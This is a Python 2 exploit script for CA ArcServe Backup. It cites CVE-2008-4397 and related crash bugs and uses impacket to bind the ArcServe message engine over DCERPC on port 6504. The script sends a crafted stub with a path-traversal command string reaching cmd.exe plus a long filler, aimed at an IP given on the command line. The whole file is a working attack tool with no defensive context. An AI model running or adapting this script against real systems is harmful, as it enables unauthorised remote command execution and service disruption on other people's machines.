import socket
import codecs
import random
import sys

from struct import pack

from impacket.dcerpc import transport, dcerpc
from impacket import uuid, smb


print "CA ArcServe Exploit"
print ""
print "References"
print ""
print "CVE-2008-4397 - Message engine command injection"
print "CVE-2008-4398 - Tape engine denial of service"
print "CVE-2008-4399 - Database engine denial of service"
print "CVE-2008-4400 - Multiple service crash"
print ""
print "Acknowledgement"
print ""
print "CVE-2008-4397 - Haifei Li of Fortinet's FortiGuard Global Security Research Team"
print "CVE-2008-4398 - Vulnerability Research Team of Assurent Secure Technologies, a TELUS Company"
print "CVE-2008-4399 - Vulnerability Research Team of Assurent Secure Technologies, a TELUS Company"
print "CVE-2008-4400 - Greg Linares of eEye Digital Security"
print ""
print "Exploit URL : http://crackinglandia.blogspot.com/2009/10/el-colador-de-ca-computer-associates.html"
print ""



def get_hostname(ip):
     smbs = smb.SMB("*SMBSERVER", ip)
     return smbs.get_server_name()
    
def make_random_string(size):
     Str = ""
     while (len(Str)< size):
        char = random.randint(0x30, 0x7a)
        if ((char >= 0x30) & (char< 0x39)) | ((char >= 0x41) & (char< 0x5a)) | ((char >= 0x61) & (char< 0x7a)):
           Str += chr(char)
     return Str

def pack_ndr_string(Str):
     Str += "\x00"
     _str = pack_ndr_long(len(Str)) + pack_ndr_long(0) + pack_ndr_long(len(Str)) + Str + align_ndr_string(Str)
     return _str

def pack_ndr_byte(Str):
     return pack("B", Str)

def pack_ndr_long(Str):
     return pack("<L", Str)

def pack_ndr_short(Str):
     return pack("<H", Str)

def align_ndr_string(Str):
     return "\x00" * ((4 - (len(Str) & 3)) & 3)

def build_stub_packet(ip):
     pad = make_random_string(10)
     cmd = pack_ndr_string("A" * 2000)
     
     try:
          stub =  pack_ndr_string(codecs.ascii_encode(get_hostname(ip))[0])
          stub += pack_ndr_string("..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\system32\\cmd /c \"""\"""") + cmd
          stub += pack_ndr_string(pad) + pack_ndr_long(2) + pack_ndr_long(2)
          stub += pack_ndr_string(make_random_string(random.randint(0,4) + 1).upper()) + pack_ndr_long(0) + pack_ndr_long(4)
     except Exception, e:
          raise e
     return stub

def dce_connect_and_exploit(target):
     trans = transport.TCPTransport(target, 6504)
     trans.connect()
     
     dce = dcerpc.DCERPC_v5(trans)
     dce.bind(uuid.uuidtup_to_bin(('506b1890-14c8-11d1-bbc3-00805fa6962e', '1.0')))
     
     print "Building packet ..."
     request = build_stub_packet(ip)
     
     print "Sending packet ..."
     dce.call(342, request)
     
ip = sys.argv[1]
dce_connect_and_exploit(ip)
